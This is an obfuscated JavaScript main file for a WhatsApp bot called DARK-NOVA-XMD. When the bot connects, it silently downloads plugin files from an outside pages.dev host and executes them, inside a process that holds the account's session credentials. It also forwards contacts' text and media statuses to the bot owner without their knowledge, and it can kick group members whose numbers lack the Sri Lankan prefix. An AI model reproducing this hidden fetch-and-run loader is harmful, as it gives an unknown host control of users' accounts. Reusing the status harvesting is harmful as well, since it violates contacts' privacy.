const _0x4b106d = _0x4e0e; function _0x45b5() { const _0xde7006 = ['messages', 'viewOnceMessageV2', '❌ Failed to forward text status:', '121226VbdfMh', 'slice', 'READ_MESSAGE', 'antiLinkGroups', ' @', 'pluginHooks', ' forwarded.', 'video', 'axios', '❗ [DARK-NOVA-XMD] SESSION_ID not found in env. Please configure it.', '540909rAvdhb', 'පොන්නයා', 'floor', 'participant', 'pipe', 'trim', 'macOS', 'public', 'find', 'antiBadwordGroups', 'stickerMessage', '1041132EciFja', '206778ecRmns', 'finish', 'output', '[✓] Status seen: ', 'groupParticipantsUpdate', '25305Efiozx', 'name', './lib/msg', ' has been removed from *', 'remote_plugins', 'existsSync', 'log', 'function', '❌ Failed to mark status as seen:', 'endsWith', '✅ [DARK-NOVA-XMD] All plugins installed Successfully', '120JkJdwq', 'groupMetadata', 'replace', 'this group', 'some', 'react', '📥 [DARK-NOVA-XMD] Session file downloaded and saved.', 'Message', 'https', 'image/jpeg', '@g.us', 'unknown@s.whatsapp.net', 'path', 'push', './command', 'writeFile', 'status@broadcast', 'AUTO_STATUS_REACT', 'pushName', 'statusCode', '🌐 [DARK-NOVA-XMD] Web server running → http://localhost:', 'documentMessage', 'https://github.com/dula9x/DARK-NOVA-XMD-V1-WEB-PAIR/blob/main/images/WhatsApp%20Image%202025-08-15%20at%2017.22.03_c520eb7b.jpg?raw=true', 'AUTO_STATUS_REPLY', 'Marked message from ', 'fuck', '19158685QvPqIq', ' removed — only Sri Lankan numbers allowed.', 'server', 'Hey, DARK-NOVA-XMD started✅', 'sendMessage', 'text', 'test', 'split', 'onMessage error:', 'random', '[❌ Error Loading Plugin] ', 'image', '✅ Media status from ', 'https://test30-26o.pages.dev/plugins/', '❌ Failed to react to status:', 'key', 'alias', 'extendedTextMessage', 'participants', 'true', 'creds.update', 'fromURL', '372TiAJsl', 'SESSION_ID', 'toLowerCase', '11vDIQNb', 'subject', 'startsWith', 'listen', 'caption', 'send', ' with ', '2lFYSut', '_mediaBuffer', 'Group participants update error:', 'connection.update', 'env', 'messages.update', '@whiskeysockets/baileys', 'Firefox', 'error', '16leWjES', 'readMessages', 'message', 'concat', '[PLUGIN ERROR] ', '❌ Failed to pre-download media:', 'decodeJid', 'download', 'https://mega.nz/file/', ' as read.', './config', '📵 @', '712bnioTh', 'conversation', 'unlink', '✅ Text-only status from ', 'filter', 'includes', '╭─────── ⭓ ⭓ ⭓ ─────────╮\x0a│ 🍁 ＤＡＮＵＷＡ－ 〽️Ｄ 🍁 │\x0a╰──────────────⟡───────╯\x0a\x0a📝 *Text Status*\x0a👤 From: @', '/auth_info_baileys/creds.json', 'loggedOut', 'AUTO_STATUS__MSG', 'AUTO_STATUS_SEEN', 'හුකන්නා', 'imageMessage', 'silent', 'fromMe', '9732XYJhUc', 'user', 'remove', 'join', 'https://github.com/dula9x/DARK-NOVA-XMD-V1-WEB-PAIR/blob/main/images/WhatsApp%20Image%202025-08-15%20at%2017.22.03_c520eb7b.jpg?raw=true', 'open', 'onMessage', 'length', '\x0a╔═══◉ *🟢 STATUS: ONLINE* ◉═══╗\x0a║ 𝙷𝚎𝚢 𝙳𝚞𝚍𝚎, 𝙸’𝚖 𝚑𝚎𝚛𝚎 𝚝𝚘 𝚑𝚎𝚕𝚙 𝚢𝚘𝚞. \x0a║ 𝙰𝚜𝚔 𝚖𝚎 𝚊𝚗𝚢𝚝𝚑𝚒𝚗𝚐! 💬\x0a╚══════════════════════╝\x0a\x0a🧾 *PROFILE INFORMATION*\x0a┌──────── ⋆⋅☆⋅⋆ ────────┐\x0a│ 🔐 *Owner:* DARK-NOVA-XMD \x0a│ 👤 *Botname:* DARK-NOVA-XMD \x0a│ ⚡ *Bio:* Powerful WhatsApp Bot \x0a│ 🧩 *Role:* Wizard Lord 🧙‍♂️ \x0a└──────── ⋆⋅☆⋅⋆ ────────┘\x0a\x0a🚀 Powered By *DANUKA*\x0a*DISANAYAKA* 🔥\x0a ', 'ALIVE_IMG', 'from', '/auth_info_baileys/', 'No Group Name', '🛰️ [DARK-NOVA-XMD] Initializing WhatsApp connection...', '╭────── ⭓ ⭓ ⭓ ───────╮\x0a│🍁 ＤＡＮＵＷＡ－ 〽️Ｄ 🍁│\x0a╰──────────⟡────────╯\x0a\x0a📥 *Forwarded Status*\x0a👤 From: @', '🔧 [DARK-NOVA-XMD] Installing plugins...', 'onDelete error:', 'mimetype', 'idiot', '@s.whatsapp.net', 'onDelete', 'close', '[✓] Reacted to status of ', 'ephemeralMessage', '*! 👋\x0a\x0aThank you for being part of ', 'antiFakeGroups', 'videoMessage', 'catch', 'express', 'get', 'private']; _0x45b5 = function() { return _0xde7006; }; return _0x45b5(); }(function(_0x2d20e1, _0x28ba7d) { const _0x859d79 = _0x4e0e, _0x54e5e8 = _0x2d20e1(); while (!![]) { try { const _0x572274 = -parseInt(_0x859d79(0x1a6)) / 0x1 * (-parseInt(_0x859d79(0x1f1)) / 0x2) + -parseInt(_0x859d79(0x215)) / 0x3 * (-parseInt(_0x859d79(0x206)) / 0x4) + -parseInt(_0x859d79(0x1ab)) / 0x5 * (-parseInt(_0x859d79(0x1e7)) / 0x6) + -parseInt(_0x859d79(0x190)) / 0x7 * (-parseInt(_0x859d79(0x1fa)) / 0x8) + -parseInt(_0x859d79(0x19a)) / 0x9 * (-parseInt(_0x859d79(0x1b6)) / 0xa) + -parseInt(_0x859d79(0x1ea)) / 0xb * (-parseInt(_0x859d79(0x1a5)) / 0xc) + -parseInt(_0x859d79(0x1d0)) / 0xd; if (_0x572274 === _0x28ba7d) break; else _0x54e5e8['push'](_0x54e5e8['shift']()); } catch (_0x429e18) { _0x54e5e8['push'](_0x54e5e8['shift']()); } } }(_0x45b5, 0x71fa8)); const { default: makeWASocket, useMultiFileAuthState, DisconnectReason, jidNormalizedUser, getContentType, proto, generateWAMessageContent, generateWAMessage, AnyMessageContent, prepareWAMessageMedia, areJidsSameUser, downloadContentFromMessage, MessageRetryMap, generateForwardMessageContent, generateWAMessageFromContent, generateMessageID, makeInMemoryStore, jidDecode, fetchLatestBaileysVersion, Browsers } = require(_0x4b106d(0x1f7)), fs = require('fs'), P = require('pino'), config = require(_0x4b106d(0x204)), { ownerNumber } = require('./config'), { BOT_OWNER } = require(_0x4b106d(0x204)), util = require('util'), axios = require(_0x4b106d(0x198)), qrcode = require('qrcode-terminal'), { sms } = require(_0x4b106d(0x1ad)), { getBuffer, getGroupAdmins, getRandom, h2k, isUrl, Json, runtime, sleep, fetchJson } = require('./lib/functions'), { File } = require('megajs'), express = require(_0x4b106d(0x18a)), path = require(_0x4b106d(0x1c2)), https = require(_0x4b106d(0x1be)), app = express(), port = process[_0x4b106d(0x1f5)]['PORT'] || 0x1f40, prefix = '.'; if (!fs[_0x4b106d(0x1b0)](__dirname + _0x4b106d(0x20d))) { if (!config['SESSION_ID']) return console[_0x4b106d(0x1b1)](_0x4b106d(0x199)); const sessdata = config[_0x4b106d(0x1e8)], filer = File[_0x4b106d(0x1e6)](_0x4b106d(0x202) + sessdata); filer[_0x4b106d(0x201)]((_0x35ae50, _0xfafe25) => { const _0x4306af = _0x4b106d; if (_0x35ae50) throw _0x35ae50; fs[_0x4306af(0x1c5)](__dirname + _0x4306af(0x20d), _0xfafe25, () => { const _0x3772df = _0x4306af; console['log'](_0x3772df(0x1bc)); }); }); } const { replyHandlers, commands } = require(_0x4b106d(0x1c4)); function _0x4e0e(_0x296eca, _0x3340d8) { const _0x45b5df = _0x45b5(); return _0x4e0e = function(_0x4e0e7d, _0x3cc91b) { _0x4e0e7d = _0x4e0e7d - 0x170; let _0x58e3dd = _0x45b5df[_0x4e0e7d]; return _0x58e3dd; }, _0x4e0e(_0x296eca, _0x3340d8); } async function loadRemotePlugins() { const _0x34f7e6 = _0x4b106d; console[_0x34f7e6(0x1b1)](_0x34f7e6(0x17d)), global[_0x34f7e6(0x195)] = []; const _0x421bc7 = 'https://test30-26o.pages.dev/plugins.json', _0x310254 = _0x34f7e6(0x1dd), _0x1d7673 = path[_0x34f7e6(0x171)](__dirname, _0x34f7e6(0x1af)); if (!fs[_0x34f7e6(0x1b0)](_0x1d7673)) fs['mkdirSync'](_0x1d7673); try { const _0x1bb716 = await axios['get'](_0x421bc7), _0xae5f30 = _0x1bb716['data']; for (const _0x21d172 of _0xae5f30) { const _0x1451df = _0x21d172[_0x34f7e6(0x1ac)], _0x45a877 = _0x310254 + _0x1451df, _0x26ff11 = path[_0x34f7e6(0x171)](_0x1d7673, _0x1451df), _0x4af923 = fs['createWriteStream'](_0x26ff11); await new Promise((_0x289493, _0x2843a6) => { const _0x5dc2fb = _0x34f7e6; https['get'](_0x45a877, _0x2a2d52 => { const _0x11596d = _0x4e0e; _0x2a2d52[_0x11596d(0x19e)](_0x4af923), _0x4af923['on'](_0x11596d(0x1a7), () => { const _0x25ffed = _0x11596d; _0x4af923[_0x25ffed(0x183)](_0x289493); }); })['on'](_0x5dc2fb(0x1f9), _0x42f00c => { const _0x2dc2b1 = _0x5dc2fb; fs[_0x2dc2b1(0x208)](_0x26ff11, () => {}), _0x2843a6(_0x42f00c); }); }); try { const _0x4ec6e4 = require(_0x26ff11); _0x4ec6e4 && (_0x4ec6e4[_0x34f7e6(0x174)] || _0x4ec6e4['onDelete']) && global[_0x34f7e6(0x195)][_0x34f7e6(0x1c3)](_0x4ec6e4); } catch (_0x2e4034) { console['error'](_0x34f7e6(0x1da) + _0x1451df + ':', _0x2e4034[_0x34f7e6(0x1fc)]); } } } catch (_0x13e644) { console['error']('❌ [DARK-NOVA-XMD] Failed to load plugins:', _0x13e644[_0x34f7e6(0x1fc)]); } } async function connectToWA() { const _0x30e2dc = _0x4b106d; console['log'](_0x30e2dc(0x17b)); const { state: _0x346cff, saveCreds: _0x4ee8b9 } = await useMultiFileAuthState(__dirname + _0x30e2dc(0x179)), { version: _0x527530 } = await fetchLatestBaileysVersion(), _0x3e0ad3 = makeWASocket({ 'logger': P({ 'level': _0x30e2dc(0x213) }), 'printQRInTerminal': ![], 'browser': Browsers[_0x30e2dc(0x1a0)](_0x30e2dc(0x1f8)), 'syncFullHistory': !![], 'auth': _0x346cff, 'version': _0x527530 }); _0x3e0ad3['ev']['on']('group-participants.update', async _0x299764 => { const _0x4aa044 = _0x30e2dc; console[_0x4aa044(0x1b1)]('📥 New Group Update:', _0x299764['id']); }), _0x3e0ad3['ev']['on']('group-participants.update', async _0xc02f41 => { const _0x5d6ce1 = _0x30e2dc; try { const { id: _0x101180, participants: _0x1957b1, action: _0x2788d0 } = _0xc02f41, _0x4b620e = await _0x3e0ad3[_0x5d6ce1(0x1b7)](_0x101180), _0x1966a6 = _0x4b620e['subject'] || _0x5d6ce1(0x1b9); if (_0x2788d0 === 'add') for (const _0x53e1cc of _0x1957b1) { if (global[_0x5d6ce1(0x187)] ? .[_0x101180]) { const _0x5e6871 = _0x53e1cc[_0x5d6ce1(0x1d7)]('@')[0x0]; if (!_0x5e6871[_0x5d6ce1(0x1ec)]('94')) { await _0x3e0ad3[_0x5d6ce1(0x1d4)](_0x101180, { 'text': _0x5d6ce1(0x205) + _0x5e6871 + _0x5d6ce1(0x1d1), 'mentions': [_0x53e1cc] }), await _0x3e0ad3[_0x5d6ce1(0x1aa)](_0x101180, [_0x53e1cc], _0x5d6ce1(0x170)); continue; } } const _0x131ea4 = _0x53e1cc['split']('@')[0x0], _0x4bec68 = '🗯️ *WELCOME TO ' + _0x1966a6 + _0x5d6ce1(0x194) + _0x131ea4 + '!* ❤‍🩹\x0a\x0aWe’re delighted to have you join our community.\x0a\x0a✅ Please take a moment to read the group rules and feel free to introduce yourself.\x0a\x0a💎 *Let’s build a friendly and respectful environment together!*'; await _0x3e0ad3[_0x5d6ce1(0x1d4)](_0x101180, { 'image': { 'url': _0x5d6ce1(0x1cc) }, 'caption': _0x4bec68, 'mentions': [_0x53e1cc] }); } if (_0x2788d0 === _0x5d6ce1(0x170)) for (const _0x2fbcb5 of _0x1957b1) { const _0x1ab3b8 = _0x2fbcb5[_0x5d6ce1(0x1d7)]('@')[0x0], _0x479a4f = '👋 *Goodbye @' + _0x1ab3b8 + _0x5d6ce1(0x186) + _0x1966a6 + '.* We wish you all the best!❤‍🩹*'; await _0x3e0ad3[_0x5d6ce1(0x1d4)](_0x101180, { 'image': { 'url': _0x5d6ce1(0x172) }, 'caption': _0x479a4f, 'mentions': [_0x2fbcb5] }); } } catch (_0x4f25c3) { console[_0x5d6ce1(0x1f9)](_0x5d6ce1(0x1f3), _0x4f25c3); } }), _0x3e0ad3['ev']['on'](_0x30e2dc(0x1f4), async _0x149857 => { const _0x4d519a = _0x30e2dc, { connection: _0x11880f, lastDisconnect: _0x450b07 } = _0x149857; if (_0x11880f === _0x4d519a(0x183) && _0x450b07 ? .[_0x4d519a(0x1f9)] ? .[_0x4d519a(0x1a8)] ? .[_0x4d519a(0x1c9)] !== DisconnectReason[_0x4d519a(0x20e)]) connectToWA(); else { if (_0x11880f === _0x4d519a(0x173)) { await loadRemotePlugins(), console[_0x4d519a(0x1b1)](_0x4d519a(0x1b5)); const _0xff0e50 = _0x4d519a(0x176); _0x3e0ad3[_0x4d519a(0x1d4)](ownerNumber[0x0] + '@s.whatsapp.net', { 'image': { 'url': config[_0x4d519a(0x177)] }, 'caption': _0xff0e50 }); } } }), _0x3e0ad3['ev']['on'](_0x30e2dc(0x1e5), _0x4ee8b9), _0x3e0ad3['ev']['on']('messages.upsert', async _0x294a0b => { const _0x4e406a = _0x30e2dc; _0x294a0b = _0x294a0b[_0x4e406a(0x18d)][0x0]; if (!_0x294a0b[_0x4e406a(0x1fc)]) return; const _0x110e36 = getContentType(_0x294a0b[_0x4e406a(0x1fc)]), _0x4754ae = _0x294a0b[_0x4e406a(0x1fc)][_0x110e36]; if (['imageMessage', _0x4e406a(0x188), 'audioMessage', _0x4e406a(0x1a4), _0x4e406a(0x1cb)][_0x4e406a(0x20b)](_0x110e36)) try { const _0x410efe = await downloadContentFromMessage(_0x4754ae, _0x110e36[_0x4e406a(0x1b8)](_0x4e406a(0x1bd), '')), _0x5d4dbe = []; for await (const _0x114c6d of _0x410efe) _0x5d4dbe[_0x4e406a(0x1c3)](_0x114c6d); _0x294a0b[_0x4e406a(0x1f2)] = Buffer[_0x4e406a(0x1fd)](_0x5d4dbe), _0x294a0b['_mediaType'] = _0x110e36; } catch (_0x2a2a6d) { console[_0x4e406a(0x1b1)](_0x4e406a(0x1ff), _0x2a2a6d[_0x4e406a(0x1fc)]); } getContentType(_0x294a0b['message']) === _0x4e406a(0x185) && (_0x294a0b['message'] = _0x294a0b[_0x4e406a(0x1fc)][_0x4e406a(0x185)]['message']); if (global[_0x4e406a(0x195)]) for (const _0x3518b7 of global['pluginHooks']) { if (_0x3518b7[_0x4e406a(0x174)]) try { await _0x3518b7[_0x4e406a(0x174)](_0x3e0ad3, _0x294a0b); } catch (_0x25c1ac) { console[_0x4e406a(0x1b1)](_0x4e406a(0x1d8), _0x25c1ac); } } config[_0x4e406a(0x192)] === 'true' && (await _0x3e0ad3[_0x4e406a(0x1fb)]([_0x294a0b[_0x4e406a(0x1e0)]]), console['log'](_0x4e406a(0x1ce) + _0x294a0b[_0x4e406a(0x1e0)][_0x4e406a(0x1de)] + _0x4e406a(0x203))); if (_0x294a0b['message'][_0x4e406a(0x18e)]) _0x294a0b[_0x4e406a(0x1fc)] = getContentType(_0x294a0b['message']) === 'ephemeralMessage' ? _0x294a0b[_0x4e406a(0x1fc)][_0x4e406a(0x185)][_0x4e406a(0x1fc)] : _0x294a0b[_0x4e406a(0x1fc)]; if (_0x294a0b[_0x4e406a(0x1e0)] ? .[_0x4e406a(0x1de)] === _0x4e406a(0x1c6)) { const _0x1cdb26 = _0x294a0b[_0x4e406a(0x1e0)][_0x4e406a(0x19d)] || _0x294a0b[_0x4e406a(0x1e0)][_0x4e406a(0x1de)] || _0x4e406a(0x1c1), _0x438966 = _0x1cdb26[_0x4e406a(0x20b)]('@s.whatsapp.net') ? _0x1cdb26 : _0x1cdb26 + _0x4e406a(0x181); if (config[_0x4e406a(0x210)] === 'true') try { await _0x3e0ad3[_0x4e406a(0x1fb)]([_0x294a0b[_0x4e406a(0x1e0)]]), console['log'](_0x4e406a(0x1a9) + _0x294a0b[_0x4e406a(0x1e0)]['id']); } catch (_0x800761) { console['error'](_0x4e406a(0x1b3), _0x800761); } if (config[_0x4e406a(0x1c7)] === _0x4e406a(0x1e4) && _0x294a0b['key'][_0x4e406a(0x19d)]) try { const _0x490a36 = ['❤️', '💸', '😇', '🍂', '💥', '💯', '🔥', '💫', '💎', '💗', '🤍', '🖤', '👀', '🙌', '🙆', '🚩', '🥰', '💐', '😎', '🤎', '✅', '🫀', '🧡', '😁', '😄', '🌸', '🕊️', '🌷', '⛅', '🌟', '🗿', '💜', '💙', '🌝', '🖤', '💚'], _0x1682e7 = _0x490a36[Math[_0x4e406a(0x19c)](Math[_0x4e406a(0x1d9)]() * _0x490a36[_0x4e406a(0x175)])]; await _0x3e0ad3[_0x4e406a(0x1d4)](_0x294a0b[_0x4e406a(0x1e0)][_0x4e406a(0x19d)], { 'react': { 'text': _0x1682e7, 'key': _0x294a0b[_0x4e406a(0x1e0)] } }), console[_0x4e406a(0x1b1)](_0x4e406a(0x184) + _0x294a0b[_0x4e406a(0x1e0)][_0x4e406a(0x19d)] + _0x4e406a(0x1f0) + _0x1682e7); } catch (_0x1ed233) { console['error'](_0x4e406a(0x1df), _0x1ed233); } if (_0x294a0b[_0x4e406a(0x1fc)] ? .[_0x4e406a(0x1e2)] && !_0x294a0b[_0x4e406a(0x1fc)][_0x4e406a(0x212)] && !_0x294a0b[_0x4e406a(0x1fc)][_0x4e406a(0x188)]) { const _0x2c9019 = _0x294a0b['message'][_0x4e406a(0x1e2)][_0x4e406a(0x1d5)] || ''; if (_0x2c9019[_0x4e406a(0x19f)]()[_0x4e406a(0x175)] > 0x0) try { await _0x3e0ad3[_0x4e406a(0x1d4)](ownerNumber[0x0] + _0x4e406a(0x181), { 'text': _0x4e406a(0x20c) + _0x438966[_0x4e406a(0x1d7)]('@')[0x0] + '\x0a\x0a' + _0x2c9019, 'mentions': [_0x438966] }), console[_0x4e406a(0x1b1)](_0x4e406a(0x209) + _0x438966 + _0x4e406a(0x196)); } catch (_0x2dc183) { console[_0x4e406a(0x1f9)](_0x4e406a(0x18f), _0x2dc183); } } if (_0x294a0b[_0x4e406a(0x1fc)] ? .[_0x4e406a(0x212)] || _0x294a0b[_0x4e406a(0x1fc)] ? .[_0x4e406a(0x188)]) try { const _0x4bd64d = _0x294a0b['message'][_0x4e406a(0x212)] ? _0x4e406a(0x212) : _0x4e406a(0x188), _0xd9495d = _0x294a0b[_0x4e406a(0x1fc)][_0x4bd64d], _0x1cfa08 = await downloadContentFromMessage(_0xd9495d, _0x4bd64d === _0x4e406a(0x212) ? _0x4e406a(0x1db) : _0x4e406a(0x197)); let _0xb1ff71 = Buffer[_0x4e406a(0x178)]([]); for await (const _0x1e3a21 of _0x1cfa08) { _0xb1ff71 = Buffer[_0x4e406a(0x1fd)]([_0xb1ff71, _0x1e3a21]); } const _0x17f28f = _0xd9495d[_0x4e406a(0x17f)] || (_0x4bd64d === _0x4e406a(0x212) ? _0x4e406a(0x1bf) : 'video/mp4'), _0x2b5ddc = _0xd9495d[_0x4e406a(0x1ee)] || ''; await _0x3e0ad3[_0x4e406a(0x1d4)](ownerNumber[0x0] + _0x4e406a(0x181), { [_0x4bd64d === 'imageMessage' ? _0x4e406a(0x1db) : 'video']: _0xb1ff71, 'mimetype': _0x17f28f, 'caption': _0x4e406a(0x17c) + _0x438966[_0x4e406a(0x1d7)]('@')[0x0] + '\x0a\x0a' + _0x2b5ddc, 'mentions': [_0x438966] }), console[_0x4e406a(0x1b1)](_0x4e406a(0x1dc) + _0x438966 + ' forwarded.'); } catch (_0x44af9a) { console[_0x4e406a(0x1f9)]('❌ Failed to download or forward media status:', _0x44af9a); } } if (_0x294a0b[_0x4e406a(0x1e0)] && _0x294a0b[_0x4e406a(0x1e0)]['remoteJid'] === _0x4e406a(0x1c6) && config[_0x4e406a(0x1cd)] === 'true') { const _0x5620d3 = _0x294a0b['key'][_0x4e406a(0x19d)], _0x64f9e6 = '' + config[_0x4e406a(0x20f)]; await _0x3e0ad3['sendMessage'](_0x5620d3, { 'text': _0x64f9e6, 'react': { 'text': '✈️', 'key': _0x294a0b['key'] } }, { 'quoted': _0x294a0b }); } const _0x4bf4b6 = sms(_0x3e0ad3, _0x294a0b), _0x44b008 = getContentType(_0x294a0b['message']), _0x52fcc0 = _0x294a0b[_0x4e406a(0x1e0)][_0x4e406a(0x1de)], _0x142137 = _0x44b008 === _0x4e406a(0x207) ? _0x294a0b[_0x4e406a(0x1fc)]['conversation'] : _0x294a0b['message'][_0x44b008] ? .[_0x4e406a(0x1d5)] || _0x294a0b[_0x4e406a(0x1fc)][_0x44b008] ? .['caption'] || '', _0x3e8974 = _0x142137['startsWith'](prefix), _0x29708a = _0x3e8974 ? _0x142137[_0x4e406a(0x191)](prefix[_0x4e406a(0x175)])[_0x4e406a(0x19f)]()[_0x4e406a(0x1d7)]('\x20')[0x0][_0x4e406a(0x1e9)]() : '', _0xa8e810 = _0x142137[_0x4e406a(0x19f)]()[_0x4e406a(0x1d7)](/ +/)[_0x4e406a(0x191)](0x1), _0x51ec3c = _0xa8e810[_0x4e406a(0x171)]('\x20'), _0xef0602 = _0x294a0b[_0x4e406a(0x1e0)][_0x4e406a(0x214)] ? _0x3e0ad3[_0x4e406a(0x216)]['id']['split'](':')[0x0] + _0x4e406a(0x181) || _0x3e0ad3[_0x4e406a(0x216)]['id'] : _0x294a0b[_0x4e406a(0x1e0)]['participant'] || _0x294a0b['key'][_0x4e406a(0x1de)], _0x4f858b = _0xef0602[_0x4e406a(0x1d7)]('@')[0x0], _0x2be0ff = _0x52fcc0[_0x4e406a(0x1b4)](_0x4e406a(0x1c0)), _0x3899f9 = _0x3e0ad3[_0x4e406a(0x216)]['id']['split'](':')[0x0], _0x247abd = _0x294a0b[_0x4e406a(0x1c8)] || 'Sin Nombre', _0xefc159 = _0x3899f9[_0x4e406a(0x20b)](_0x4f858b), _0x5a39b2 = ownerNumber[_0x4e406a(0x20b)](_0x4f858b) || _0xefc159, _0x221325 = await jidNormalizedUser(_0x3e0ad3[_0x4e406a(0x216)]['id']), _0x18765a = _0x2be0ff ? await _0x3e0ad3[_0x4e406a(0x1b7)](_0x52fcc0)[_0x4e406a(0x189)](() => ({})) : {}, _0x252f91 = _0x18765a ? .[_0x4e406a(0x1eb)] || _0x4e406a(0x17a), _0x1533d7 = _0x18765a[_0x4e406a(0x1e3)] || [], _0x275ede = _0x2be0ff ? getGroupAdmins(_0x1533d7) : [], _0x4dbb3e = _0x275ede['map'](jidNormalizedUser), _0x266065 = jidNormalizedUser(_0xef0602), _0xb8d6eb = jidNormalizedUser(_0x3e0ad3[_0x4e406a(0x216)]['id']), _0x57c8a0 = _0x4dbb3e[_0x4e406a(0x20b)](_0x266065), _0x4f2775 = _0x4dbb3e[_0x4e406a(0x20b)](_0xb8d6eb); _0x2be0ff && global[_0x4e406a(0x193)] ? .[_0x52fcc0] && !_0x57c8a0 && /(https?:\/\/[^\s]+)/i[_0x4e406a(0x1d6)](_0x142137) && (await _0x3e0ad3[_0x4e406a(0x1d4)](_0x52fcc0, { 'text': '🚫 Link detected!\x0a@' + _0x4f858b + _0x4e406a(0x1ae) + _0x252f91 + '*!', 'mentions': [_0xef0602] }), await _0x3e0ad3[_0x4e406a(0x1aa)](_0x52fcc0, [_0xef0602], 'remove')); const _0x3818a9 = [_0x4e406a(0x1cf), 'shit', _0x4e406a(0x180), 'bitch', 'puka', 'උඹ', 'කැරියා', 'හුත්තා', 'පකයා', _0x4e406a(0x211), _0x4e406a(0x19b)]; _0x2be0ff && global[_0x4e406a(0x1a3)] ? .[_0x52fcc0] && !_0x57c8a0 && (_0x3818a9[_0x4e406a(0x1ba)](_0x11fd12 => _0x142137[_0x4e406a(0x1e9)]()['includes'](_0x11fd12)) && (await _0x3e0ad3[_0x4e406a(0x1d4)](_0x52fcc0, { 'text': '🧼 Bad word detected!\x0a@' + _0x4f858b + _0x4e406a(0x1ae) + _0x252f91 + '*!', 'mentions': [_0xef0602] }), await _0x3e0ad3[_0x4e406a(0x1aa)](_0x52fcc0, [_0xef0602], _0x4e406a(0x170)))); const _0x396b9c = (_0x2f61ff, _0x133e20 = {}) => _0x3e0ad3[_0x4e406a(0x1d4)](_0x52fcc0, { 'text': _0x2f61ff, ..._0x133e20 }, { 'quoted': _0x294a0b }); _0x3e0ad3[_0x4e406a(0x200)] = _0x1dca09 => { const _0x4567ee = _0x4e406a; if (!_0x1dca09) return _0x1dca09; if (/:\d+@/gi['test'](_0x1dca09)) { let _0x59304e = jidDecode(_0x1dca09) || {}; return _0x59304e[_0x4567ee(0x216)] && _0x59304e['server'] && _0x59304e[_0x4567ee(0x216)] + '@' + _0x59304e[_0x4567ee(0x1d2)] || _0x1dca09; } else return _0x1dca09; }; if (_0x3e8974) { const _0x1b174e = commands[_0x4e406a(0x1a2)](_0x11982d => _0x11982d['pattern'] === _0x29708a || _0x11982d[_0x4e406a(0x1e1)] && _0x11982d['alias'][_0x4e406a(0x20b)](_0x29708a)); if (_0x1b174e) { switch ((config['MODE'] || _0x4e406a(0x1a1))[_0x4e406a(0x1e9)]()) { case _0x4e406a(0x18c): if (!_0x5a39b2) return; break; case _0x4e406a(0x1a1): default: break; } if (_0x1b174e[_0x4e406a(0x1bb)]) _0x3e0ad3[_0x4e406a(0x1d4)](_0x52fcc0, { 'react': { 'text': _0x1b174e[_0x4e406a(0x1bb)], 'key': _0x294a0b[_0x4e406a(0x1e0)] } }); try { _0x1b174e[_0x4e406a(0x1b2)](_0x3e0ad3, _0x294a0b, _0x4bf4b6, { 'from': _0x52fcc0, 'quoted': _0x294a0b, 'body': _0x142137, 'isCmd': _0x3e8974, 'command': _0x29708a, 'args': _0xa8e810, 'q': _0x51ec3c, 'isGroup': _0x2be0ff, 'sender': _0xef0602, 'senderNumber': _0x4f858b, 'botNumber2': _0x221325, 'botNumber': _0x3899f9, 'pushname': _0x247abd, 'isMe': _0xefc159, 'isOwner': _0x5a39b2, 'groupMetadata': _0x18765a, 'groupName': _0x252f91, 'participants': _0x1533d7, 'groupAdmins': _0x4dbb3e, 'isBotAdmins': _0x4f2775, 'isAdmins': _0x57c8a0, 'reply': _0x396b9c }); } catch (_0x793f50) { console[_0x4e406a(0x1f9)](_0x4e406a(0x1fe) + _0x793f50); } } } const _0x5382c3 = _0x142137; for (const _0x257fe6 of replyHandlers) { if (_0x257fe6[_0x4e406a(0x20a)](_0x5382c3, { 'sender': _0xef0602, 'message': _0x294a0b })) try { await _0x257fe6[_0x4e406a(0x1b2)](_0x3e0ad3, _0x294a0b, _0x4bf4b6, { 'from': _0x52fcc0, 'quoted': _0x294a0b, 'body': _0x5382c3, 'sender': _0xef0602, 'reply': _0x396b9c }); break; } catch (_0x1a49a6) { console[_0x4e406a(0x1b1)]('Reply handler error:', _0x1a49a6); } } }), _0x3e0ad3['ev']['on'](_0x30e2dc(0x1f6), async _0x5139f8 => { const _0x19324f = _0x30e2dc; if (global[_0x19324f(0x195)]) for (const _0x19a1cf of global[_0x19324f(0x195)]) { if (_0x19a1cf[_0x19324f(0x182)]) try { await _0x19a1cf[_0x19324f(0x182)](_0x3e0ad3, _0x5139f8); } catch (_0x785de7) { console[_0x19324f(0x1b1)](_0x19324f(0x17e), _0x785de7); } } }); } app[_0x4b106d(0x18b)]('/', (_0x382c05, _0x2e64db) => { const _0x1138fc = _0x4b106d; _0x2e64db[_0x1138fc(0x1ef)](_0x1138fc(0x1d3)); }), app[_0x4b106d(0x1ed)](port, () => console['log'](_0x4b106d(0x1ca) + port)), setTimeout(() => { connectToWA(); }, 0xfa0);